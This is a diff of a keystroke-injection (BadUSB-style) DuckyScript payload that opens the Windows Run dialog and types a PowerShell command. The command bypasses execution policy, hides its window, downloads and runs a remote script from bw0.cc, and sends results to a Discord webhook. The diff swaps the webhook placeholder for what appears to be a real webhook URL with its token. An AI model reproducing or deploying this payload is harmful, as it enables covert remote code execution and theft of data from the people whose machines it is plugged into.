@@ -12,7 +12,8 @@ REM open powershell
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C $hide='y'; $dc = 'YOUR_WEBHOOK_HERE' ; iex (irm bw0.cc/dcscr)
+STRING powershell -Ep Bypass -C $hide='y'; $dc = 'https://discordapp.com/api/webhooks/1438747699057787002/-8uBJdypDRdMA5YT-4KWgGlMrAq7-wA78WK33A51laTQwXul-0zhaNEQHhsrMUDDylIo' ; iex (irm bw0.cc/dcscr)
 ENTER
+
 
 
